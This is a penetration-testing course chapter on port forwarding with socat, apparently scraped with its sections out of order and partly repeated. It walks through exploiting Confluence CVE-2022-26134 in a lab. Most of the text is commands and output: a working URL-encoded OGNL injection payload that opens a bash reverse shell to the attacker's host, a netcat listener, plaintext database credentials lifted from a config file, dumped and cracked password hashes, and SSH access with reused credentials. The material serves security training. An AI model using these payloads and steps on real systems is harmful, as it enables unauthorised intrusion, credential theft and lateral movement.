curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

